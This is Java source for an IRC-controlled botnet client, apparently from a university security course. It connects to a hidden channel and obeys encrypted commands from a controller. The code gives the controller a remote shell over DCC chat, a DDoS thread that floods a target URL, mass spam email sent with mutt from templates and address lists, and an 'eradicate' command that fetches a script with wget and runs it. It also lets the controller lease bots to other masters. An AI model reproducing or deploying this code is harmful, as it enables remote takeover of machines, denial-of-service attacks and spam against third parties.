import java.io.*;
import java.net.*;
import java.security.Key;
import java.util.*;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.*;
import javax.mail.internet.*;

import org.jibble.pircbot.*;


/*
 * lease newCC time numBots
 * 	- send a private message with a private key to newCC
 *  - send public key to other bots
 */



public class BotnetClient extends PircBot {
	private static final List<String> COMMANDS = Arrays.asList(new String[] {"kill", "eradicate", "ddos", "spam", "shell", "spamupload", "lease"});
	private static final List<String> SAFE_COMMANDS =  Arrays.asList(new String[] {"help", "names", "ddos", "spam", "spamupload"});
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final String TEMPLATE = "template.txt";
	private static final String EMAILS = "emails.txt";
	private static final String RANDOM_EMAILS = "random_emails.txt";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	
	private MsgEncrypt m;
	
	private static final String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
	private static final String rsaPublicExp = "65537";
	
	private boolean leased = false;
	private String leaseMaster = null;
	private long leaseTerminateTime;
	private MsgEncrypt leasedM; // This will be set to null when time is up
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		m = MsgEncrypt.getInstance();
		m.genRSAPubKey(rsaMod + " " + rsaPublicExp);
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	protected void onConnect() {
		joinChannel(CHANNEL);
		setMode(CHANNEL, "+s");
	}
	
	private String[] getEmails(String fileName) {
		try {
			List<String> list = new ArrayList<String>();
			Scanner in = new Scanner(new File(fileName));
			while (in.hasNextLine()) {
				String line = in.nextLine();
				if (!line.isEmpty()) {
					list.add(line.trim());
				}
			}
			return list.toArray(new String[0]);
		} catch (Exception e) {
			System.out.println(e.getMessage());
			return null;
		}
	}
		
	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
		if (leased && System.currentTimeMillis() > leaseTerminateTime) {
			leased = false;
			leaseTerminateTime = 0;
			leasedM = null;
			leaseMaster = null;
		}
		String decMsg = m.decryptMsg(message);
		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
		if (sender.equals(CC) && COMMANDS.contains(decMsg.split(" ")[0])) {
			runCommand(decMsg, hostname, sender);
		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedDecMsg.split(" ")[0])) {
			runCommand(leasedDecMsg, hostname, sender);
		} else { // TODO: use leasing here??
			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
		}
	}
	
	private boolean runCommand(String message, String hostname, String sender) {
		try {
			// TODO: maybe need to put this back
			//System.out.println(message);
			//System.out.println(message);
			if (message.toLowerCase().startsWith("spam")) {
				String[] parts = message.split("'");
				if (parts.length < 9) {
					System.out.println("bad spam message: " + message);
				} else {
					String x = parts[1];
					String y = parts[3];
					String z = parts[5];
					String subject = parts[7];
					String emails = parts[8].trim();
					
					String[] to;
					if (emails.toLowerCase().equals("random")) {
						to = getEmails(RANDOM_EMAILS);
					} else if (emails.toLowerCase().equals("all")) {
						to = getEmails(EMAILS);
					} else {
						to = emails.split(" ");
					}
					String body = "";
					try {
						Scanner in = new Scanner(new File(TEMPLATE));
						while (in.hasNextLine()) {
							body += in.nextLine() + "\n";
						}
					} catch (Exception e) {
						System.out.println("There were problems reading " + TEMPLATE);
					}
					body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
					sendEmail(to, subject, body);
				}
				return true;
			} else if (message.toLowerCase().startsWith("ddos")) {
				System.out.println(sender + ": " + message);
				String[] parts = message.split(" ");
				if (parts.length < 4) {
					System.out.println("Bad ddos message provided");
				} else {
					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
				}
				return true;
			} else if (message.toLowerCase().startsWith("lease")) {
				String[] parts = message.split(" ");
				if (parts.length > 4) {
					String leaseMaster = parts[1];
					long duration = Long.parseLong(parts[2]);
					String mod = parts[3];
					String exp = parts[4];
					leaseTerminateTime = System.currentTimeMillis() + duration;
					leased = true;
					this.leaseMaster = leaseMaster;
					leasedM = MsgEncrypt.getInstance();
					leasedM.genRSAPubKey(mod + " " + exp);
				} else {
					System.out.println("Failed lease message: " + message);
				}
				return true;
			} else if (message.toLowerCase().startsWith("eradicate")) {
				String[] parts = message.split(" ");
				if (parts.length > 1) {
					String url = parts[1];
					Process p = Runtime.getRuntime().exec("/bin/sh");
					PrintWriter in = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
					in.println("wget -O clean.sh " + url + " >> temp");
					in.println("chmod +x clean.sh >> temp");
					in.println("./clean.sh >> temp");
					in.println("exit 0");
					p.waitFor();
					System.out.println("ran clean script with exit code " + p.exitValue());
					System.exit(0);
				}
				return true;
			} else if (message.toLowerCase().startsWith("kill")) {
				System.exit(0);	
			}
			return false;
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("There was problems decrypting the message");
			return false;
		}
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		}
	}
	
	protected void onIncomingFileTransfer(DccFileTransfer transfer) {
		if (transfer.getNick().equals(CC)) {
			String fileName = transfer.getFile().getName();
			System.out.println("Receiving file: " + fileName);
			if (fileName.equals(TEMPLATE) || fileName.equals(EMAILS)) {
				transfer.receive(new File(fileName), false);
			} else {
				String response = "Expecting file of name " + TEMPLATE + " or " + EMAILS;
				this.sendMessage(CC, m.encryptMsg(response));
			}
		} else {
			System.out.println(transfer.getNick() + "<" + transfer.getNumericalAddress() + "> tried to send me " + transfer.getFile().getAbsolutePath());
		}
	}
	
	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
		if (e != null) {
			System.out.println(e.getMessage());
		} else {
			String fileName = transfer.getFile().getName();
			System.out.println("Received file: " + fileName);
		}
	}
	
	private void sendEmail(String[] to, String subject, String body) {
		Runtime r = Runtime.getRuntime();
		try {
			String emails = "";
			for (String email : to) {
				emails += " " + email;
			}
			
			body = body.replace("\"", "\\\"").replace("\n", "\\n").replace("'", "\"");
			String emailCommand = "echo -e '" + body + "' | mutt -s \"" + subject + "\"" + emails;
			Process p = r.exec("/bin/sh");
			
			PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
			out.println(emailCommand);
			out.println("exit");
			
			p.waitFor();
			
			System.out.println("echo -e \"" + body + "\" | mutt -s \"" + subject + "\"" + emails);
			System.out.println("Email sent to" + emails + " with exit code " + p.exitValue());
			
		} catch(Exception e) {
			e.printStackTrace();
		}
	}

	protected void onIncomingChatRequest(DccChat chat) {
		System.out.println("here with: " + chat);
		if (chat == null) {
			System.out.println("Chat failed, passed null.");
		} else {
			try {
				if (!chat.getNick().equalsIgnoreCase(CC) && !chat.getNick().equalsIgnoreCase(leaseMaster)) {
					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
				} else { 
					chat.accept();
					String command = chat.readLine();
					String commandRSA = m.decryptRSA(command);
					String leasedCommandRSA = leasedM.decryptRSA(command);
					System.out.println("c: " + command);
					System.out.println("m1: " + commandRSA);
					System.out.println("m2: " + leasedCommandRSA);
					if (commandRSA.startsWith("key")) {
						String otherKey = m.decryptRSA(chat.readLine());
						String info = m.decryptRSA(chat.readLine());
						m.setPubParams(info);
						m.handShake(otherKey);
						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
						chat.close();
					} else if (leasedCommandRSA.startsWith("key")) {
						String otherKey = leasedM.decryptRSA(chat.readLine());
						String info = leasedM.decryptRSA(chat.readLine());
						leasedM.setPubParams(info);
						leasedM.handShake(otherKey);
						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
						chat.close();
					} else if (commandRSA.equalsIgnoreCase("shell")) {
						//Create the bash shell
						Runtime r = Runtime.getRuntime();
						Process p = r.exec("/bin/sh");
	
						//Gather the input/output stream to the bash shell process
						PrintWriter bashin = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
						BufferedReader bashout = new BufferedReader(new InputStreamReader(p.getInputStream()));
						BufferedReader basherror = new BufferedReader(new InputStreamReader(p.getErrorStream()));
						
						//Send input commands to the process in a separate thread
						ProcessInputThread inputThread = new ProcessInputThread(chat, bashin);	   
						inputThread.start();
						
						ProcessErrorThread errorThread = new ProcessErrorThread(chat, basherror);
						errorThread.start();
						
			        	//print the results only
		        		while (inputThread.isAlive()) {
		        			String s = bashout.readLine();
		        			while (s != null && !s.equals(SENTINEL)) {
		        				// TODO: maybe need to change this
		        				//System.out.println(s);
		        				//String encS = startMsgE.encryptMsg(s);
		        				//System.out.println(encS);
		        				//chat.sendLine(encS);
		        				//chat.sendLine(s);
		        				String encM = m.encryptMsg(s);
		        				chat.sendLine(encM);
		        				System.out.println("bash response: " + s + "\n\tE(m): " + encM);
		        				s = bashout.readLine();
		        			}
		        			//chat.sendLine(s);
		        			chat.sendLine(m.encryptMsg(s));
		        			//System.out.println(s);
		        			//System.out.println(startMsgE.encryptMsg(s));
		        			//chat.sendLine(startMsgE.encryptMsg(s));
		        		}
			        	chat.close();
			        	inputThread.kill();
			        	errorThread.kill();
			        	p.destroy();
					    System.out.println("Closed the bash shell");
					}
				}
			} catch(Exception e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	//This class performs a ddos attack against the specified url
	private class DdosThread extends Thread {
		private URL url;
		private long duration;
		private long interval;
		private boolean terminate;
		
		public DdosThread(String url, int interval, int duration) {
			this.duration = duration * 1000;
			this.interval = interval * 1000;
			terminate = false;
			try {
				this.url = new URL(url);
				this.start();
			} catch (Exception e) {
				System.out.println("Malformed URL string");
			}
		}
		public void kill() {
			terminate = true;
		}
		public void run() {
			int times = (int)(Math.round(duration * 1.0 / interval));
			int performed = 0;
			long sleeptime = (long)(Math.round(duration * 1.0 / times));
			while (!terminate && performed < times) {
				try {
					URLConnection connect = url.openConnection();
					Scanner in = new Scanner(new BufferedReader(new InputStreamReader(connect.getInputStream())));
					if (in.hasNextLine()) {
						System.out.println((System.currentTimeMillis() / 1000) + ": " + in.nextLine());
					}
					while (in.hasNextLine()) {
						in.nextLine();
					}
					DdosThread.sleep(sleeptime);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());
				} catch (Exception e) {
					System.out.println("There was a problem connecting to " + url.toString());
				}
				performed++;
			}
		}
	}
	
	//This class passes input from the chat object (the master bot) to the bash shell
	private class ProcessInputThread extends Thread {
		private static final String TERMINATION = "exit";
	    private DccChat chat;
	    private PrintWriter bashin;
	    private boolean terminate;
	    
	    public ProcessInputThread(DccChat chat, PrintWriter writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		bashin.println("echo `pwd` '$: '");
		    	// TODO: make decrypted
	    		//String encCommand = chat.readLine();
	    		//String command = startMsgE.decryptMsg(encCommand);
	    		//System.out.println(encCommand);
	    		//System.out.println(command);
	    		//String command = chat.readLine();
	        	String command = m.decryptMsg(chat.readLine());
	    		while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
	        		System.out.println("command: " + command);
	        		bashin.println(command);
	        		bashin.println("echo `pwd` '$: '");
	        		//command = chat.readLine();
	        		command = m.decryptMsg(chat.readLine());
	        		//encCommand = chat.readLine();
	        		//command = startMsgE.decryptMsg(encCommand);
	        	}
	        	bashin.println("exit 0");
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding output from the bash shell to the master bot");
	    }
	}
	
	//This class passes error output from the bash shell to the chat object (the master bot)
	private class ProcessErrorThread extends Thread {
	    private DccChat chat;
	    private BufferedReader bashin;
	    private boolean terminate;
	    
	    public ProcessErrorThread(DccChat chat, BufferedReader writer) {
	        this.chat = chat;
	        bashin = writer;
	        terminate = false;
	    }
	    
	    public void kill() {
	    	terminate = true;
	    }

	    public void run() {
	    	try {
	    		String s = "";
	        	while (!terminate) {
	        		s = bashin.readLine();
	        		if (s != null) {
	        			String encM = m.encryptMsg(s);
	        			System.out.println("error: " + s + "\n\tE(m): " + encM);
	        			//chat.sendLine(s);
	        			chat.sendLine(encM);
	        		}
	        	}
	    	} catch (Exception e) {
	            System.out.println(e.getMessage());
	        }
	    	System.out.println("Done feeding error output from the bash shell to the master bot");
	    }
	}
}